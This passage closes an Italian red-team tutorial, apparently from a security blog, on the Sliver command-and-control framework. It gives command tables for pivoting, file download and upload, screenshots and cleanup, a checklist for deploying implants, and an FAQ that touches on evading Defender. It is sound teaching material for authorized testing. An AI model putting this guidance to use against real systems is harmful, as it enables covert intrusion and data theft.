| `portfwd add`  | inoltra una singola porta specifica verso un host interno                  |

**File / Loot**

| Comando      | Cosa fa                                                |
| ------------ | ------------------------------------------------------ |
| `download`   | scarica un file dal target                             |
| `upload`     | carica un file sul target                              |
| `screenshot` | cattura lo schermo del target                          |
| `loot`       | mostra tutto ciò che hai raccolto durante l'engagement |

**Cleanup**

| Comando        | Cosa fa                      |
| -------------- | ---------------------------- |
| `kill`         | termina l'implant sul target |
| `jobs -k <id>` | ferma un listener specifico  |

***

## Checklist operativa

```
[ ] Server installato, mingw-w64 se serve compilare per Windows
[ ] Listener avviato con protocollo/porta decisi in anticipo
[ ] Implant generato con parametri che combaciano esattamente col listener
[ ] Binario verificato (ls/file/sha256sum) prima della delivery
[ ] Scelta consapevole beacon (check-in periodico) vs sessione (interattività)
[ ] Armory: moduli verificati prima dell'uso in engagement reale, installazione mirata invece di "install all"
[ ] Rotazione di protocolli/porte tra engagement diversi
[ ] Cleanup finale: kill sessioni, stop listener, rimozione artefatti dal target
```

***

## FAQ

**Sliver è legale da usare?**
Sì, è un framework open source per test di sicurezza autorizzati. Come ogni C2, va usato solo in lab, CTF, o red team con autorizzazione scritta esplicita — lo stesso strumento è anche usato da threat actor reali, motivo in più per restare sempre nello scope autorizzato.

**Meglio Sliver o Cobalt Strike?**
Cobalt Strike ha più anni di sviluppo commerciale e un ecosistema di terze parti più maturo, ma costa. Sliver è gratis, open source, e sufficientemente maturo da coprire la maggior parte dei casi d'uso di un red team, incluso l'uso nei percorsi OSEP.

**Beacon o sessione, quale scegliere di default?**
Beacon per la maggior parte dei casi — meno rumoroso, sufficiente per task di enumerazione e post-exploitation asincrono. Sessione solo quando serve davvero interattività in tempo reale.

**Perché il mio implant non si connette?**
Nel 90% dei casi è un mismatch tra IP/porta/protocollo dell'implant generato e il listener effettivamente avviato — controlla prima quello.

**Sliver funziona su Linux e da Kali?**
Sì, server e client girano su Linux (anche macOS e Windows), Kali incluso: è l'ambiente più comune per ospitare il Teamserver in lab.

**Sliver fa pivoting?**
Sì, tramite `socks5` (proxy generico verso la rete interna) e `portfwd` (singola porta specifica).

**Sliver bypassa Windows Defender?**
Non va considerato un bypass garantito. La detection dipende dalla versione dell'implant, dalla configurazione del sistema, dall'EDR in uso e dalla telemetria disponibile — `--evasion` aiuta ma non è una certezza.

***

## Articoli Correlati — HackIta C2 & Post-Exploitation Cluster

**Setup & Pivoting:**

* [Pivoting Completo: Recon, Scelta Tool, OPSEC, Scenario End-to-End](https://hackita.it/articoli/pivoting) — come arrivare al target
* Ligolo-ng: kernel routing TUN, se raw TCP è disponibile
* [DNS Pivoting: Iodine e Dnscat2 (ultima risorsa)](https://hackita.it/articoli/dns-pivoting) — listener DNS standalone

**Post-Exploitation Active Directory:**

* [Mimikatz: Credential Dumping SAM/LSA/Kerberos](https://hackita.it/articoli/mimikatz) — estrai creds dai moduli Armory
* [DCSync: NTDS Replication via Kerberos](https://hackita.it/articoli/dcsync) — replica DC database
* [NetExec: SMB/LDAP Enumeration & Exploitation](https://hackita.it/articoli/netexec) — validazione creds massiva

**Riferimenti ufficiali:**
[Sliver GitHub](https://github.com/BishopFox/sliver) — releases, source code
[Sliver Wiki](https://github.com/BishopFox/sliver/wiki) — documentazione, examples
